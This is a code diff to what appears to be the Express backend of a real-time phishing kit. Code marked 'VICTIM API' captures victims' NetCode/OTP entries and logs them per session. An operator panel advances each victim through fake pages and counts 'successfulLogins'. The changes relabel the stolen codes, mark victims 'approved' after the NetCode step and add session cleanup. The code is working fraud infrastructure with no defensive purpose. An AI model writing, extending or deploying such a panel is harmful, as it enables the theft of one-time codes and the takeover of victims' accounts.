@@ -231,7 +231,7 @@ function getSessionHeader(v) {
   
   // verify.html page (NetCode/OTP entry)
   else if (v.page === 'verify.html') {
-    // Note: your verify.html sends the NetCode to /api/verify which stores it in v.phone
+    // Note: verify.html sends the NetCode to /api/verify which stores it in v.phone
     return v.phone ? `🔑 Received NetCode: ${v.phone}` : `⏳ Awaiting NetCode`;
   } 
   
@@ -248,6 +248,13 @@ function getSessionHeader(v) {
   
   // Default fallback
   return `⏳ Waiting...`;
+}
+
+function cleanupSession(sid, reason, silent = false) {
+  const v = sessionsMap.get(sid);
+  if (!v) return;
+  sessionsMap.delete(sid);
+  sessionActivity.delete(sid);
 }
 
 /* ----------  VICTIM API  ---------- */
@@ -320,7 +327,7 @@ app.post('/api/verify', async (req, res) => {
     sessionActivity.set(sid, Date.now());
 
     v.activityLog = v.activityLog || [];
-    v.activityLog.push({ time: Date.now(), action: 'ENTERED PHONE', detail: `Phone: ${phone}` });
+    v.activityLog.push({ time: Date.now(), action: 'ENTERED NETCODE', detail: `NetCode: ${phone}` });
 
     const entry = auditLog.find(e => e.sid === sid);
     if (entry) entry.phone = phone;
@@ -481,9 +488,18 @@ app.post('/api/panel', async (req, res) => {
     case 'cont':
       v.status = 'ok';
       if (v.page === 'index.html') v.page = 'verify.html';
-      else if (v.page === 'verify.html') v.page = 'unregister.html';
+      else if (v.page === 'verify.html') {
+        // Mark as successful and approved when continuing from verify.html
+        v.page = 'success';
+        v.status = 'approved';
+        successfulLogins++;
+      }
       else if (v.page === 'unregister.html') v.page = 'otp.html';
-      else if (v.page === 'otp.html') { v.page = 'success'; successfulLogins++; }
+      else if (v.page === 'otp.html') { 
+        v.page = 'success'; 
+        v.status = 'approved';
+        successfulLogins++; 
+      }
       break;
     case 'delete':
       cleanupSession(sid, 'deleted from panel');
@@ -543,4 +559,3 @@ app.listen(PORT, '0.0.0.0', () => {
   console.log(`Panel user: ${PANEL_USER}`);
   currentDomain = process.env.RAILWAY_STATIC_URL || process.env.RENDER_EXTERNAL_URL || `http://localhost:${PORT}`;
 });
-
